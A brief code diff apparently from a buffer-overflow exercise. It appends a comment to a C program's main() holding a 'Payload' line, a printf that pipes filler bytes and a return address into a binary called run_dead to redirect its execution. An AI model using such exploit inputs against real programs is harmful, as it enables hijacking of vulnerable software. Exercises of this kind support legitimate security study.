@@ -21,3 +21,6 @@ int main()
   getData();
   return 0;
 }
+
+// Payload
+// printf "12345678\x9b\x84\x04\x08" | ./run_dead
